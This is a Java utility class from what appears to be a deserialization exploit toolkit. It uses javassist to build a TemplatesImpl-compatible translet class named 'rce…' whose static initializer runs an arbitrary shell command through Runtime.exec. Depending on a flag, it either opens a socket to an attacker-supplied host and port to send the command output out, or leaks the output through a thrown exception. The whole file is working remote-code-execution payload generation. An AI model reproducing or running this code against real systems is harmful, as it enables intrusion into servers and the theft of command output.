package util;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;
import payload.PayloadType;

import java.io.IOException;
import java.io.Serializable;

public class Utils {

    public static Class<? extends PayloadType> getPayloadClass(final String className) {
        Class<? extends PayloadType> clazz = null;
        try {
            clazz = (Class<? extends PayloadType>) Class.forName(className);
        } catch (Exception e1) {
        }
        if (clazz == null) {
            try {
                return clazz = (Class<? extends PayloadType>) Class
                        .forName("payload." + className);
            } catch (Exception e2) {
            }
        }
        if (clazz != null && !PayloadType.class.isAssignableFrom(clazz)) {
            clazz = null;
        }
        return clazz;
    }

    public static byte[] getPayloadByte(String command, Boolean flag, String... args) throws CannotCompileException, IOException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.get(StubTransletPayload.class.getName());
        String cmd = "Process proc = java.lang.Runtime.getRuntime().exec(\"" +
                command.replace("\\", "\\\\").replace("\"", "\\\"") +
                "\");" +
                "        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));" +
                "        StringBuffer sb = new StringBuffer();" +
                "        String line;" +
                "        while ((line = br.readLine()) != null)" +
                "        {" +
                "            sb.append(line).append(\"\\n\");" +
                "        }" +
                "         String result = \"cmdResult: \" + sb.toString() + \"cmdEnd\";";

        if (flag) {
            cmd = cmd + "java.net.Socket s = null;\n" +
                    "\n" +
                    "        java.io.BufferedWriter  bw = null;\n" +
                    "      \n" +
                    "            s = javax.net.SocketFactory.getDefault().createSocket(\"" + args[0] + "\", " + args[1] + ");\n" +
                    "            s.setKeepAlive(true);\n" +
                    "            s.setTcpNoDelay(true);\n" +
                    "\n" +
                    "            java.io.OutputStream os = s.getOutputStream();\n" +
                    "             bw = new java.io.BufferedWriter(new java.io.OutputStreamWriter(os));\n" +
                    "            bw.write(result);\n" +
                    "            bw.flush();\n" +
                    "            if (bw != null) {\n" +
                    "\n" +
                    "                bw.close();\n" +
                    "            }\n" +
                    "            if (s != null) {\n" +
                    "                s.close();\n" +
                    "            }";
        } else {
            cmd = cmd + "throw new java.lang.InstantiationException(result);";
        }

        cc.makeClassInitializer().insertAfter(cmd);
        String randomName = "rce" + System.nanoTime();
        cc.setName(randomName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        return classBytes;
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }


        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }
}
